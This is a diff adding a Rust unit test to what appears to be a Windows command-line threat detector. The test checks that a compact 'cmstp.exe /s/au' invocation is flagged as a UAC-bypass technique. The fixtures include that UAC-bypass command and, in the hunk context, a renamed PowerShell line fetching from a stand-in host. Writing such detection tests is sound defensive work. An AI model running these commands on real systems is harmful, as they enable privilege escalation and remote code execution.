@@ -14119,6 +14119,19 @@ C:\Users\Public\psh.pif -NoProfile -Command "iwr https://esentutl-alias.example/
     }
 
     #[test]
+    fn cmstp_compact_au_switch_emits_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"cmstp.exe /s/au C:\Users\Public\stage.inf"#, &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
+            "cmstp compact /s/au command was not surfaced: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msconfig_4_direct_command_emits_uac_bypass_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line("msconfig /4", &mut env);
